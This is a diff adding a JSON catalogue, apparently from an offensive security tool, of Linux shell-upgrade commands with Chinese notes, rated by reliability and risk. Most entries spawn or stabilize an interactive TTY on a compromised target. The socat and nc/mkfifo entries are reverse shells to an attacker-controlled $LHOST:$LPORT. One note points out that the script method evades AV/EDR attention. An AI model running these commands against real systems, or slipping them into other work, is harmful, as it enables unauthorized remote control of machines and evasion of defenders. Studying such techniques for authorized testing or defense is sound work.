@@ -1,0 +1,116 @@
+[
+  {
+    "id": "lx-python",
+    "name": "Python PTY",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "python3"
+    ],
+    "reliability": 95,
+    "risk": "low",
+    "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "note": "最通用的一步到位方案；无 python3 时改用 python / python2 同款语法。"
+  },
+  {
+    "id": "lx-python-alt",
+    "name": "Python 导入式 PTY",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "python"
+    ],
+    "reliability": 88,
+    "risk": "low",
+    "cmd": "python -c 'import pty; pty.spawn(\"/bin/sh\")'",
+    "note": "目标只有 python2 时使用，得到的是 /bin/sh，交互能力略弱于 bash。"
+  },
+  {
+    "id": "lx-script",
+    "name": "script 伪终端",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "script"
+    ],
+    "reliability": 90,
+    "risk": "low",
+    "cmd": "/usr/bin/script -qc /bin/bash /dev/null",
+    "note": "util-linux 自带，无需任何脚本语言；最不容易被 AV/EDR 关注。"
+  },
+  {
+    "id": "lx-socat",
+    "name": "socat 全交互 PTY",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "socat"
+    ],
+    "reliability": 92,
+    "risk": "medium",
+    "cmd": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT",
+    "note": "需要攻击端先 nc -lvnp $LPORT 监听；配合反向连接得到完整 job control。"
+  },
+  {
+    "id": "lx-nc-fifo",
+    "name": "nc + FIFO 反向交互",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "nc"
+    ],
+    "reliability": 75,
+    "risk": "medium",
+    "cmd": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f",
+    "note": "经典双向管道；无 job control，需再配合 Ctrl+Z + stty raw 完成固化。"
+  },
+  {
+    "id": "lx-bash-i",
+    "name": "bash -i 半交互",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [],
+    "reliability": 60,
+    "risk": "low",
+    "cmd": "bash -i 2>&1",
+    "note": "能拿到提示符但 job control 常报 \"no job control in this shell\"，仅作过渡。"
+  },
+  {
+    "id": "lx-env",
+    "name": "环境变量修正",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [],
+    "reliability": 85,
+    "risk": "low",
+    "cmd": "export TERM=xterm-256color; export SHELL=/bin/bash; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    "note": "修正 TERM/PATH 后 vim、top、less 等程序才能正常渲染。"
+  },
+  {
+    "id": "lx-raw",
+    "name": "Ctrl+Z → stty raw（完整 TTY）",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "stty"
+    ],
+    "reliability": 99,
+    "risk": "low",
+    "manual": true,
+    "cmd": "# 攻击端依次执行三步（最后一步在靶机 shell 中）：\n# 1) 靶机 shell 中按 Ctrl+Z 挂起\nstty raw -echo; fg\n# 2) 回车后按 Ctrl+C\nreset\n# 3) 靶机 shell 中执行：\nexport TERM=xterm-256color; export SHELL=/bin/bash",
+    "note": "拿到 PTY 后必做的收尾：开启 raw 模式，补全 Ctrl+C / 退格 / su / ssh 等交互行为。"
+  },
+  {
+    "id": "lx-reset",
+    "name": "reset 修复终端",
+    "platform": "linux",
+    "target": "Linux",
+    "needs": [
+      "reset"
+    ],
+    "reliability": 80,
+    "risk": "low",
+    "cmd": "reset",
+    "note": "回显错乱、方向键乱码时执行，恢复终端状态。"
+  }
+]
